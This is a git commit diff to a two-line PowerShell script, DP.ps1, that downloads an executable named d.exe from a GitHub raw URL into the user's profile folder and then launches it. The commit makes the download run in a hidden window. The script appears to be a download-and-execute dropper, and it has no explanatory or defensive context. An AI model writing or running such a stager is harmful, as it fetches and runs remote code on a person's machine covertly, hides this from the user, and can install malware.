c6d38c0fc3a57cbff73b6a07514a968c0db0e208
skekic16 <151707511+skekic16@users.noreply.github.com>
2023-12-27 15:07:33 -0600

    Update DP.ps1

--- DP.ps1
+++ DP.ps1
@@ -1,2 +1,2 @@
-iwr https://github.com/skekic16/lol/raw/main/d.exe?dl=1 -O $Env:USERPROFILE\d.exe
+powershell -WindowStyle Hidden iwr https://github.com/skekic16/lol/raw/main/d.exe?dl=1 -O $Env:USERPROFILE\d.exe
 Start-process "$env:USERPROFILE\d.exe"
